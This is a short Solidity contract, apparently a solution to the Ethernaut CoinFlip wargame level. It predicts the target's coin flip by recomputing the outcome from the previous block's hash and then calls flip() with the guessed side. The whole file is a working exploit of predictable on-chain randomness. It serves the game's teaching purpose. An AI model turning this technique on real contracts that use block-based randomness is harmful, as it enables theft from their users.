// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./3_CoinFlip.sol";

contract Ethernaut3 {
    CoinFlip public flipper = CoinFlip(0x0a145c252eb64279B8e5A833474897C45532Ce85);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;

        flipper.flip(side);
    }

}